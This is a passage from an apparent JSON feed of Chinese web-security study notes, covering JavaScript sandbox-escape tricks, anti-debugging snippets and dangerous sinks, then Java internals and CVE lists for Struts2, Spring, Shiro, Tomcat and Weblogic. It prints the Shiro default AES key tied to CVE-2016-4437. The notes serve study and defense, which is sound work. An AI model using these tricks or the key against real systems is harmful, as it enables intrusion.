class-name\">Array</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>shift</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>regSource<span class=\"token punctuation\">.</span>length <span class=\"token operator\">=</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>left  <span class=\"token operator\">=</span> regSource <span class=\"token operator\">+</span> empty <span class=\"token comment\">// 生成 (</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>quest <span class=\"token operator\">=</span> regSource <span class=\"token operator\">+</span> empty <span class=\"token comment\">// 生成？</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>colon <span class=\"token operator\">=</span> regSource <span class=\"token operator\">+</span> empty <span class=\"token comment\">// 生成 :</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>right <span class=\"token operator\">=</span> regSource <span class=\"token operator\">+</span> empty <span class=\"token comment\">// 生成 )</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>xss <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>xss<span class=\"token punctuation\">.</span>source <span class=\"token operator\">=</span> <span class=\"token string\">'xss'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>xss<span class=\"token punctuation\">.</span>flags <span class=\"token operator\">=</span> <span class=\"token string\">'a'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>xss<span class=\"token punctuation\">.</span>toString <span class=\"token operator\">=</span> <span class=\"token class-name\">RegExp</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>toString</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>xss <span class=\"token operator\">+</span> <span class=\"token string\">\"\"</span> <span class=\"token comment\">// => /xss/a</span></pre></td></tr></table></figure><h1 id=\"其他\"><a class=\"anchor\" href=\"#其他\">#</a> 其他</h1>\n<h2 id=\"命令执行\"><a class=\"anchor\" href=\"#命令执行\">#</a> 命令执行</h2>\n<p>Node.js 中 child_process.exec 命令调用的是  <code>/bin/sh</code>  ，故可以直接使用该命令执行 shell</p>\n<h2 id=\"反调试技巧\"><a class=\"anchor\" href=\"#反调试技巧\">#</a> 反调试技巧</h2>\n<ul>\n<li>函数重定义  <code>console.log = function(a)&#123;&#125;</code></li>\n<li>定时断点  <code>setInterval(function()&#123;debugger&#125;, 1000);</code></li>\n</ul>\n<h2 id=\"对象拷贝\"><a class=\"anchor\" href=\"#对象拷贝\">#</a> 对象拷贝</h2>\n<p>JavaScript 中的对象拷贝分为浅拷贝和深拷贝。</p>\n<p>浅拷贝对一个对象进行拷贝时，仅仅拷贝对象的引用进行拷贝，但是拷贝对象和源对象还是引用同一份实体。其中一个对象的改变都会影响到另一个对象。</p>\n<p>深拷贝拷贝一个对象时，不仅仅把对象的引用进行复制，还把该对象引用的值也一起拷贝。源对象与拷贝对象互相独立，其中任何一个对象的改动都不会对另外一个对象造成影响。</p>\n<p>深拷贝可以基于  <code>for-in</code>  /  <code>object.assign()</code>  / 拓展运算符  <code>...</code>  /  <code>JSON.parse(JSON.stringify())</code>  等方式实现。其中前三种方式只对第一层做深拷贝，若对象结构较为复杂，则需要用递归的方式对更深的层次进行拷贝。</p>\n<h2 id=\"常见sink\"><a class=\"anchor\" href=\"#常见sink\">#</a> 常见 Sink</h2>\n<ul>\n<li>child_process</li>\n<li>eval</li>\n<li>exec</li>\n<li>execSync</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy9zeXN0ZW0vMTYzNTc5Lmh0bWw=\">JavaScript 反调试技巧</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5lY21hLWludGVybmF0aW9uYWwub3JnL2VjbWEtMjYyLzUuMS8jc2VjLTE1LjMuNC41\">ECMAScript Language Specification</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MTgzNzQ2P3NvcnQ9Y3JlYXRlZA==\">js prototype</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Njc2Ntcy9ndWFyZEpzLw==\">javascript 防劫持</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2ZleC5iYWlkdS5jb20vYmxvZy8yMDE0LzA2L3hzcy1mcm9udGVuZC1maXJld2FsbC0zLmh0bWw=\">XSS 前端防火墙</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vcHNlY3guY29tL2luZGV4LnBocC8yMDE3LzAyLzA4L2V4cGxvaXRpbmctbm9kZS1qcy1kZXNlcmlhbGl6YXRpb24tYnVnLWZvci1yZW1vdGUtY29kZS1leGVjdXRpb24v\">exploiting node js deserialization bug for remote code execution</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0hvTHlWaWVSL3Byb3RvdHlwZS1wb2xsdXRpb24tbnNlYzE4Lw==\">Prototype pollution attack</span> Content released at NorthSec 2018 on prototype pollution</li>\n</ul>\n",
            "tags": [
                "语言",
                "反序列化",
                "沙箱",
                "JavaScript"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Java/",
            "url": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Java/",
            "title": "Java",
            "date_published": "2022-11-27T08:50:11.000Z",
            "content_html": "<h1 id=\"基本概念\"><a class=\"anchor\" href=\"#基本概念\">#</a> 基本概念</h1>\n<h2 id=\"jvm\"><a class=\"anchor\" href=\"#jvm\">#</a> JVM</h2>\n<p>JVM 是 Java 平台的核心，以机器代码来实现，为程序执行提供了所需的所有基本功能，例如字节码解析器、JIT 编译器、垃圾收集器等。由于它是机器代码实现的，其同样受到二进制文件受到的攻击。</p>\n<p>JCL 是 JVM 自带的一个标准库，含有数百个系统类。默认情况下，所有系统类都是可信任的，且拥有所有的特权。</p>\n<h2 id=\"jdk\"><a class=\"anchor\" href=\"#jdk\">#</a> JDK</h2>\n<p>Java 开发工具包 (Java Development Kit，JDK) 是 Oracle 公司发布的 Java 平台，有标准版 (Standard Edition，Java SE)、企业版 (Enterprise Edition，Java EE) 等版本。</p>\n<p>在最开始，JDK 以二进制形式发布，而后在 2006 年 11 月 17 日，Sun 以 GPL 许可证发布了 Java 的源代码，于是之后出现了 OpenJDK。</p>\n<h2 id=\"jmx\"><a class=\"anchor\" href=\"#jmx\">#</a> JMX</h2>\n<p>JMX (Java Management Extensions，Java 管理扩展) 是一个为应用程序植入管理功能的框架，主要为管理和监视应用程序、系统对象、设备和面向服务的网络提供相应的工具。JMX 可以远程读取系统中的值、调用系统中的方法。在 JMX 未配置身份验证或 JDK 版本过低存在反序列化漏洞时，可能会导致远程代码执行。</p>\n<h2 id=\"jni\"><a class=\"anchor\" href=\"#jni\">#</a> JNI</h2>\n<p>JNI (Java Native Interface) 是 Java 提供的和其他语言交互的接口。</p>\n<h2 id=\"jna\"><a class=\"anchor\" href=\"#jna\">#</a> JNA</h2>\n<p>JNA (Java Native Access) 是在 JNI 上的框架，用于自动实现 Java 接口到 native function 的映射，而不需要另外编写 JNI 代码。</p>\n<h2 id=\"ognl\"><a class=\"anchor\" href=\"#ognl\">#</a> OGNL</h2>\n<p>OGNL (Object-Graph Navigation Language，对象导航语言) 是一种功能强大的表达式语言，通过简单一致的表达式语法，提供了存取对象的任意属性、调用对象的方法、遍历整个对象的结构图、实现字段类型转化等功能。</p>\n<p>Struts2 中使用了 OGNL，提供了一个 ValueStack 类。ValueStack 分为 root 和 context 两部分。root 中是当前的 action 对象，context 中是 ActionContext 里面所有的内容。</p>\n<h2 id=\"io模型\"><a class=\"anchor\" href=\"#io模型\">#</a> IO 模型</h2>\n<p>Java 对操作系统的各种 IO 模型进行了封装，形成了不同的 API。</p>\n<h3 id=\"bio\"><a class=\"anchor\" href=\"#bio\">#</a> BIO</h3>\n<p>BIO (Blocking I/O) 是同步阻塞 I/O 模式，数据的读取写入必须阻塞在一个线程内等待其完成。</p>\n<h3 id=\"nio\"><a class=\"anchor\" href=\"#nio\">#</a> NIO</h3>\n<p>NIO (New I/O) 是一种同步非阻塞的 I/O 模型，在 Java 1.4 中引入，对应 java.nio 包，提供了 Channel , Selector，Buffer 等抽象。</p>\n<h3 id=\"aio\"><a class=\"anchor\" href=\"#aio\">#</a> AIO</h3>\n<p>AIO (Asynchronous I/O) 在 Java 7 中引入，是 NIO 的改进版，是异步非阻塞的 IO 模型，基于事件和回调机制实现。</p>\n<h2 id=\"反射\"><a class=\"anchor\" href=\"#反射\">#</a> 反射</h2>\n<h3 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h3>\n<p>Java 反射机制是指在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能被称为语言的反射机制。</p>\n<h3 id=\"相关类\"><a class=\"anchor\" href=\"#相关类\">#</a> 相关类</h3>\n<table>\n<thead>\n<tr>\n<th>类名</th>\n<th>用途</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Class</td>\n<td>类的实体</td>\n</tr>\n<tr>\n<td>Field</td>\n<td>类的成员变量</td>\n</tr>\n<tr>\n<td>Method</td>\n<td>类的方法</td>\n</tr>\n<tr>\n<td>Constructor</td>\n<td>类的构造方法</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"class相关\"><a class=\"anchor\" href=\"#class相关\">#</a> Class 相关</h3>\n<ul>\n<li>asSubclass(Class&lt;U&gt; clazz)\n<ul>\n<li>把传递的类的对象转换成代表其子类的对象</li>\n</ul>\n</li>\n<li>Cast\n<ul>\n<li>把对象转换成代表类或是接口的对象</li>\n</ul>\n</li>\n<li>getClassLoader()\n<ul>\n<li>获得类的加载器</li>\n</ul>\n</li>\n<li>getClasses()\n<ul>\n<li>返回一个数组，数组中包含该类中所有公共类和接口类的对象</li>\n</ul>\n</li>\n<li>getDeclaredClasses()\n<ul>\n<li>返回一个数组，数组中包含该类中所有类和接口类的对象</li>\n</ul>\n</li>\n<li>forName(String className)\n<ul>\n<li>根据类名返回类的对象</li>\n</ul>\n</li>\n<li>getName()：\n<ul>\n<li>获得类的完整路径名字</li>\n</ul>\n</li>\n<li>newInstance()\n<ul>\n<li>创建类的实例</li>\n</ul>\n</li>\n<li>getPackage()\n<ul>\n<li>获得类的包</li>\n</ul>\n</li>\n<li>getSimpleName()\n<ul>\n<li>获得类的名字</li>\n</ul>\n</li>\n<li>getSuperclass()\n<ul>\n<li>获得当前类继承的父类的名字</li>\n</ul>\n</li>\n<li>getInterfaces()\n<ul>\n<li>获得当前类实现的类或是接口</li>\n</ul>\n</li>\n<li>getField(String name)\n<ul>\n<li>获得某个公有的属性对象</li>\n</ul>\n</li>\n<li>getFields()\n<ul>\n<li>获得所有公有的属性对象</li>\n</ul>\n</li>\n<li>getDeclaredField(String name)\n<ul>\n<li>获得某个属性对象</li>\n</ul>\n</li>\n<li>getDeclaredFields()\n<ul>\n<li>获得所有属性对象</li>\n</ul>\n</li>\n<li>getAnnotation(Class&lt;A&gt; annotationClass)\n<ul>\n<li>返回该类中与参数类型匹配的公有注解对象</li>\n</ul>\n</li>\n<li>getAnnotations()\n<ul>\n<li>返回该类所有的公有注解对象</li>\n</ul>\n</li>\n<li>getDeclaredAnnotation(Class&lt;A&gt; annotationClass)\n<ul>\n<li>返回该类中与参数类型匹配的所有注解对象</li>\n</ul>\n</li>\n<li>getDeclaredAnnotations()\n<ul>\n<li>返回该类所有的注解对象</li>\n</ul>\n</li>\n<li>getConstructor(Class...&lt;?&gt; parameterTypes)\n<ul>\n<li>获得该类中与参数类型匹配的公有构造方法</li>\n</ul>\n</li>\n<li>getConstructors()\n<ul>\n<li>获得该类的所有公有构造方法</li>\n</ul>\n</li>\n<li>getDeclaredConstructor(Class...&lt;?&gt; parameterTypes)\n<ul>\n<li>获得该类中与参数类型匹配的构造方法</li>\n</ul>\n</li>\n<li>getDeclaredConstructors()\n<ul>\n<li>获得该类所有构造方法</li>\n</ul>\n</li>\n<li>getMethod(String name, Class...&lt;?&gt; parameterTypes)\n<ul>\n<li>获得该类某个公有的方法</li>\n</ul>\n</li>\n<li>getMethods()\n<ul>\n<li>获得该类所有公有的方法</li>\n</ul>\n</li>\n<li>getDeclaredMethod(String name, Class...&lt;?&gt; parameterTypes)\n<ul>\n<li>获得该类某个方法</li>\n</ul>\n</li>\n<li>getDeclaredMethods()\n<ul>\n<li>获得该类所有方法</li>\n</ul>\n</li>\n<li>isAnnotation()\n<ul>\n<li>如果是注解类型则返回 true</li>\n</ul>\n</li>\n<li>isAnnotationPresent(Class&lt;? extends Annotation&gt; annotationClass)\n<ul>\n<li>如果是指定类型注解类型则返回 true</li>\n</ul>\n</li>\n<li>isAnonymousClass()\n<ul>\n<li>如果是匿名类则返回 true</li>\n</ul>\n</li>\n<li>isArray()\n<ul>\n<li>如果是一个数组类则返回 true</li>\n</ul>\n</li>\n<li>isEnum()\n<ul>\n<li>如果是枚举类则返回 true</li>\n</ul>\n</li>\n<li>isInstance(Object obj)\n<ul>\n<li>如果 obj 是该类的实例则返回 true</li>\n</ul>\n</li>\n<li>isInterface()\n<ul>\n<li>如果是接口类则返回 true</li>\n</ul>\n</li>\n<li>isLocalClass()\n<ul>\n<li>如果是局部类则返回 true</li>\n</ul>\n</li>\n<li>isMemberClass()\n<ul>\n<li>如果是内部类则返回 true</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"field相关\"><a class=\"anchor\" href=\"#field相关\">#</a> Field 相关</h3>\n<ul>\n<li>equals(Object obj)\n<ul>\n<li>属性与 obj 相等则返回 true</li>\n</ul>\n</li>\n<li>get(Object obj)\n<ul>\n<li>获得 obj 中对应的属性值</li>\n</ul>\n</li>\n<li>set(Object obj, Object value)\n<ul>\n<li>设置 obj 中对应属性值</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"method相关\"><a class=\"anchor\" href=\"#method相关\">#</a> Method 相关</h3>\n<ul>\n<li>\n<p>invoke(Object obj, Object... args)</p>\n<ul>\n<li>传递 object 对象及参数调用该对象对应的方法</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"constructor\"><a class=\"anchor\" href=\"#constructor\">#</a> Constructor</h3>\n<ul>\n<li>\n<p>newInstance(Object... initargs)</p>\n<ul>\n<li>根据传递的参数创建类的对象</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"类\"><a class=\"anchor\" href=\"#类\">#</a> 类</h1>\n<h2 id=\"生命周期\"><a class=\"anchor\" href=\"#生命周期\">#</a> 生命周期</h2>\n<p>整体来说，Java 中类的生命周期如下：加载 (Loading) -&gt; [ 连接 (Linking) : 验证 (Verification) -&gt; 准备 (Perparation) -&gt; 解析 (Resolutin) ] -&gt; 初始化 (Initialization) -&gt; 使用 (Using) -&gt; 卸载 (Unloading) 。</p>\n<p>加载过程分为三步：</p>\n<ul>\n<li>通过全限定类名来获取定义此类的二进制字节流</li>\n<li>将字节流所代表的静态存储结构转化为方法区的运行时数据结构</li>\n<li>在内存中生成代表这个类的  <code>java.lang.Class</code>  对象，作为方法区这个类的各种数据的访问入口</li>\n</ul>\n<p>验证阶段主要用于确保 Class 文件的字节流符合当前虚拟机的要求，分为几步：</p>\n<ul>\n<li>判断文件格式：是否以  <code>0xCAFEBABE</code>  开始，主次版本号是否在处理范围内</li>\n<li>元数据验证</li>\n<li>字节码验证</li>\n<li>符号引用验证</li>\n</ul>\n<h1 id=\"部分运行选项与说明\"><a class=\"anchor\" href=\"#部分运行选项与说明\">#</a> 部分运行选项与说明</h1>\n<ul>\n<li><code>-Xverify:none</code>  关闭类加载时的验证措施</li>\n</ul>\n<h1 id=\"框架\"><a class=\"anchor\" href=\"#框架\">#</a> 框架</h1>\n<h2 id=\"servlet\"><a class=\"anchor\" href=\"#servlet\">#</a> Servlet</h2>\n<h3 id=\"简介-2\"><a class=\"anchor\" href=\"#简介-2\">#</a> 简介</h3>\n<p>Servlet (Server Applet) 是 Java Servlet 的简称，称为小服务程序或服务连接器，是用 Java 编写的服务器端程序，主要功能在于交互式地浏览和修改数据，生成动态 Web 内容。</p>\n<p>狭义的 Servlet 是指 Java 语言实现的一个接口，广义的 Servlet 是指任何实现了这个 Servlet 接口的类，一般情况下，人们将 Servlet 理解为后者。Servlet 运行于支持 Java 的应用服务器中。从原理上讲，Servlet 可以响应任何类型的请求，但绝大多数情况下 Servlet 只用来扩展基于 HTTP 协议的 Web 服务器。</p>\n<h3 id=\"生命周期为\"><a class=\"anchor\" href=\"#生命周期为\">#</a> 生命周期为</h3>\n<ul>\n<li>客户端请求该 Servlet</li>\n<li>加载 Servlet 类到内存</li>\n<li>实例化并调用 init () 方法初始化该 Servlet</li>\n<li>service ()(根据请求方法不同调用  <code>doGet()</code>  /  <code>doPost()</code>  / ... /  <code>destroy()</code></li>\n</ul>\n<h3 id=\"接口\"><a class=\"anchor\" href=\"#接口\">#</a> 接口</h3>\n<pre><code>init()\n</code></pre>\n<p>在 Servlet 的生命期中，仅执行一次 init () 方法，在服务器装入 Servlet 时执行。</p>\n<pre><code>service()\n</code></pre>\n<p>service () 方法是 Servlet 的核心。每当一个客户请求一个 HttpServlet 对象，该对象的  <code>service()</code>  方法就要被调用，而且传递给这个方法一个 &quot;请求&quot;(ServletRequest) 对象和一个 &quot;响应&quot;(ServletResponse) 对象作为参数。</p>\n<h2 id=\"struts-2\"><a class=\"anchor\" href=\"#struts-2\">#</a> Struts 2</h2>\n<h3 id=\"简介-3\"><a class=\"anchor\" href=\"#简介-3\">#</a> 简介</h3>\n<p>Struts2 是一个基于 MVC 设计模式的 Web 应用框架，它本质上相当于一个 servlet，在 MVC 设计模式中，Struts2 作为控制器 (Controller) 来建立模型与视图的数据交互。</p>\n<h3 id=\"请求流程\"><a class=\"anchor\" href=\"#请求流程\">#</a> 请求流程</h3>\n<ul>\n<li>客户端发送请求的 tomcat 服务器</li>\n<li>请求经过一系列过滤器</li>\n<li>FilterDispatcher 调用 ActionMapper 来决定这个请求是否要调用某个 Action</li>\n<li>ActionMppaer 决定调用某个 ActionFilterDispatcher 把请求给 ActionProxy</li>\n<li>ActionProxy 通过 Configuration Manager 查看 structs.xml，找到对应的 Action 类</li>\n<li>ActionProxy 创建一个 ActionInvocation 对象</li>\n<li>ActionInvocation 对象回调 Action 的 execute 方法</li>\n<li>Action 执行完毕后，ActionInvocation 根据返回的字符串，找到相应的 result，通过 HttpServletResponse 返回给服务器</li>\n</ul>\n<h3 id=\"相关cve\"><a class=\"anchor\" href=\"#相关cve\">#</a> 相关 CVE</h3>\n<ul>\n<li>CVE-2016-3081 (S2-032)</li>\n<li>CVE-2016-3687 (S2-033)</li>\n<li>CVE-2016-4438 (S2-037)</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ltbXVuaW8vYXBhY2hlLXN0cnV0czItQ1ZFLTIwMTctNTYzOA==\">CVE-2017-5638</span></li>\n<li>CVE-2017-7672</li>\n<li>CVE-2017-9787</li>\n<li>CVE-2017-9793</li>\n<li>CVE-2017-9804</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21hemVuMTYwL3N0cnV0cy1wd25fQ1ZFLTIwMTctOTgwNQ==\">CVE-2017-9805</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JyaWFud3JmL1MyLTA1My1DVkUtMjAxNy0xMjYxMQ==\">CVE-2017-12611</span></li>\n<li>CVE-2017-15707</li>\n<li>CVE-2018-1327</li>\n<li>CVE-2018-11776</li>\n</ul>\n<h2 id=\"spring\"><a class=\"anchor\" href=\"#spring\">#</a> Spring</h2>\n<h3 id=\"简介-4\"><a class=\"anchor\" href=\"#简介-4\">#</a> 简介</h3>\n<p>Spring 一般指的是 Spring Framework，一个轻量级 Java 应用程序开源框架，提供了简易的开发方式。</p>\n<h3 id=\"spring-mvc\"><a class=\"anchor\" href=\"#spring-mvc\">#</a> Spring MVC</h3>\n<p>Spring MVC 根据 Spring 的模式设计的 MVC 框架，主要用于开发 Web 应用，简化开发。</p>\n<h3 id=\"spring-boot\"><a class=\"anchor\" href=\"#spring-boot\">#</a> Spring Boot</h3>\n<p>Spring 在推出之初方案较为繁琐，因此提供了 Spring Boot 作为自动化配置工具，降低项目搭建的复杂度。</p>\n<h3 id=\"请求流程-2\"><a class=\"anchor\" href=\"#请求流程-2\">#</a> 请求流程</h3>\n<ul>\n<li>用户发送请求给服务器</li>\n<li>服务器收到请求，使用 DispatchServlet 处理</li>\n<li>Dispatch 使用 HandleMapping 检查 url 是否有对应的 Controller，如果有，执行</li>\n<li>如果 Controller 返回字符串，ViewResolver 将字符串转换成相应的视图对象</li>\n<li>DispatchServlet 将视图对象中的数据，输出给服务器</li>\n<li>服务器将数据输出给客户端</li>\n</ul>\n<h3 id=\"cve概览\"><a class=\"anchor\" href=\"#cve概览\">#</a> CVE 概览</h3>\n<ul>\n<li>CVE-2018-1270\n<ul>\n<li>Spring Websocket 远程代码执行漏洞</li>\n<li>Spring Framework 5.0 - 5.0.5</li>\n<li>Spring Framework 4.3 - 4.3.15</li>\n</ul>\n</li>\n<li>CVE-2018-1273\n<ul>\n<li>Spring Data 远程代码执行漏洞</li>\n<li>Spring Data Commons 1.13 - 1.13.10</li>\n<li>Spring Data Commons 2.0 - 2.0.5</li>\n<li>Spring Data REST 2.6 - 2.6.10</li>\n<li>Spring Data REST 3.0 - 3.0.5</li>\n</ul>\n</li>\n<li>CVE-2017-8046\n<ul>\n<li>Spring Data REST 远程代码执行漏洞</li>\n</ul>\n</li>\n<li>CVE-2017-4971\n<ul>\n<li>Spring Web Flow 远程代码执行漏洞</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"shiro\"><a class=\"anchor\" href=\"#shiro\">#</a> Shiro</h2>\n<h3 id=\"简介-5\"><a class=\"anchor\" href=\"#简介-5\">#</a> 简介</h3>\n<p>Apache Shiro 是一个功能强大且易于使用的 Java 安全框架，功能包括身份验证，授权，加密和会话管理。</p>\n<h3 id=\"cve概览-2\"><a class=\"anchor\" href=\"#cve概览-2\">#</a> CVE 概览</h3>\n<ul>\n<li>CVE-2020-13933\n<ul>\n<li>Apache Shiro &lt; 1.6.0</li>\n<li>身份验证绕过漏洞</li>\n</ul>\n</li>\n<li>CVE-2020-11989\n<ul>\n<li>SHIRO-782</li>\n<li>Apache Shiro &lt; 1.5.3</li>\n<li>身份验证绕过漏洞</li>\n</ul>\n</li>\n<li>CVE-2020-1957\n<ul>\n<li>SHIRO-682</li>\n<li>Apache Shiro &lt; 1.5.2</li>\n<li>身份验证绕过漏洞</li>\n</ul>\n</li>\n<li>CVE-2019-12422\n<ul>\n<li>SHIRO-721</li>\n<li>Apache Shiro &lt; 1.4.2</li>\n<li>Padding Oracle Attack 远程代码执行漏洞</li>\n</ul>\n</li>\n<li>CVE-2016-4437\n<ul>\n<li>SHIRO-550</li>\n<li>Apache Shiro &lt;= 1.2.4</li>\n<li>反序列化远程代码执行漏洞</li>\n</ul>\n</li>\n<li>CVE-2014-0074\n<ul>\n<li>SHIRO-460</li>\n<li>Apache Shiro &lt; 1.2.3</li>\n<li>身份验证绕过漏洞</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"cve-2020-13933\"><a class=\"anchor\" href=\"#cve-2020-13933\">#</a> CVE-2020-13933</h3>\n<p>Apache Shiro 1.6.0 之前的版本，由于 Shiro 拦截器与 requestURI 的匹配流程与 Web 框架的拦截器的匹配流程有差异，攻击者构造一个特殊的 http 请求，可以绕过 Shiro 的认证，未授权访问敏感路径。</p>\n<h3 id=\"cve-2020-11989\"><a class=\"anchor\" href=\"#cve-2020-11989\">#</a> CVE-2020-11989</h3>\n<p>Apache Shiro 1.5.3 之前的版本，由于 Shiro 拦截器与 requestURI 的匹配流程与 Web 框架的拦截器的匹配流程有差异，攻击者构造一个特殊的 http 请求，可以绕过 Shiro 的认证，未授权访问敏感路径。此漏洞存在两种攻击方式。</p>\n<h3 id=\"cve-2020-1957\"><a class=\"anchor\" href=\"#cve-2020-1957\">#</a> CVE-2020-1957</h3>\n<p>Apache Shiro 1.5.2 之前的版本，由于 Shiro 拦截器与 requestURI 的匹配流程与 Web 框架的拦截器的匹配流程有差异，攻击者构造一个特殊的 http 请求，可以绕过 Shiro 的认证，未授权访问敏感路径。</p>\n<h3 id=\"cve-2019-12422\"><a class=\"anchor\" href=\"#cve-2019-12422\">#</a> CVE-2019-12422</h3>\n<p>Apache Shiro 1.4.2 之前的版本默认使用  <code>AES/CBC/PKCS5Padding</code>  模式加密，开启 RememberMe 功能的 Shiro 组件将允许远程攻击者构造序列化数据，通过 Padding Oracle Attack 进行爆破，即使在秘钥未知的条件下，也可以在目标服务器上执行任意命令。</p>\n<h3 id=\"cve-2016-4437\"><a class=\"anchor\" href=\"#cve-2016-4437\">#</a> CVE-2016-4437</h3>\n<p>Apache Shiro 1.2.5 之前的版本在  <code>org.apache.shiro.mgt.AbstractRememberMeManager</code>  中存在 AES 默认秘钥  <code>kPH+bIxk5D2deZiIxcaaaA==</code>  ，开启 RememberMe 功能的 Shiro 组件将允许远程攻击者构造序列化数据，在目标服务器上执行任意命令。</p>\n<h1 id=\"容器\"><a class=\"anchor\" href=\"#容器\">#</a> 容器</h1>\n<p>常见的 Java 服务器有 Tomcat、Weblogic、JBoss、GlassFish、Jetty、Resin、IBM Websphere 等，这里对部分框架做一个简单的说明。</p>\n<h2 id=\"tomcat\"><a class=\"anchor\" href=\"#tomcat\">#</a> Tomcat</h2>\n<p>Tomcat 是一个轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，用于开发和调试 JSP 程序。</p>\n<p>在收到请求后，Tomcat 的处理流程如下：</p>\n<ul>\n<li>客户端访问 Web 服务器，发送 HTTP 请求</li>\n<li>Web 服务器接收到请求后，传递给 Servlet 容器</li>\n<li>Servlet 容器加载 Servlet，产生 Servlet 实例后，向其传递表示请求和响应的对象</li>\n<li>Servlet 实例使用请求对象得到客户端的请求信息，然后进行相应的处理</li>\n<li>Servlet 实例将处理结果通过响应对象发送回客户端，容器负责确保响应正确送出，同时将控制返回给 Web 服务器</li>\n</ul>\n<p>Tomcat 服务器是由一系列可配置的组件构成的，其中核心组件是 Catalina Servlet 容器，它是所有其他 Tomcat 组件的顶层容器。</p>\n<h3 id=\"相关cve-2\"><a class=\"anchor\" href=\"#相关cve-2\">#</a> 相关 CVE</h3>\n<ul>\n<li>CVE-2020-1938\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8yMjgxMDguaHRtbA==\">https://www.freebuf.com/vuls/228108.html</span></li>\n</ul>\n</li>\n<li>CVE-2019-0232\n<ul>\n<li>远程代码执行</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3B5bjNyZC9DVkUtMjAxOS0wMjMyLw==\">https://github.com/pyn3rd/CVE-2019-0232/</span></li>\n</ul>\n</li>\n<li>CVE-2017-12615\n<ul>\n<li>任意文件写入</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJMU5EZzRNVEl4TXc9PSZhbXA7bWlkPTIyNDc0ODM2NTkmYW1wO2lkeD0xJmFtcDtzbj1jMjNiM2EzYjNiNDNkNzA5OTliZGJlNjQ0ZTc5ZjdlNQ==\">https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5</span></li>\n</ul>\n</li>\n<li>CVE-2013-2067</li>\n<li>CVE-2012-4534</li>\n<li>CVE-2012-4431</li>\n<li>CVE-2012-3546</li>\n<li>CVE-2012-3544</li>\n<li>CVE-2012-2733</li>\n<li>CVE-2011-3375</li>\n<li>CVE-2011-3190</li>\n<li>CVE-2008-2938</li>\n</ul>\n<h2 id=\"weblogic\"><a class=\"anchor\" href=\"#weblogic\">#</a> Weblogic</h2>\n<h3 id=\"简介-6\"><a class=\"anchor\" href=\"#简介-6\">#</a> 简介</h3>\n<p>WebLogic 是美国 Oracle 公司出品的一个 Application Server，是一个基于 Java EE 架构的中间件，WebLogic 是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的 Java 应用服务器。其将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>\n<p>WebLogic 对业内多种标准的全面支持，包括 EJB、JSP、Servlet、JMS、JDBC 等。</p>\n<h3 id=\"相关cve-3\"><a class=\"anchor\" href=\"#相关cve-3\">#</a> 相关 CVE</h3>\n<ul>\n<li>CVE-2019-2725\n<ul>\n<li>wls-wsat 反序列化远程代码执行</li>\n</ul>\n</li>\n<li>CVE-2019-2658</li>\n<li>CVE-2019-2650</li>\n<li>CVE-2019-2649</li>\n<li>CVE-2019-2648</li>\n<li>CVE-2019-2647</li>\n<li>CVE-2019-2646</li>\n<li>CVE-2019-2645</li>\n<li>CVE-2019-2618\n<ul>\n<li><span class=\"exturl\" 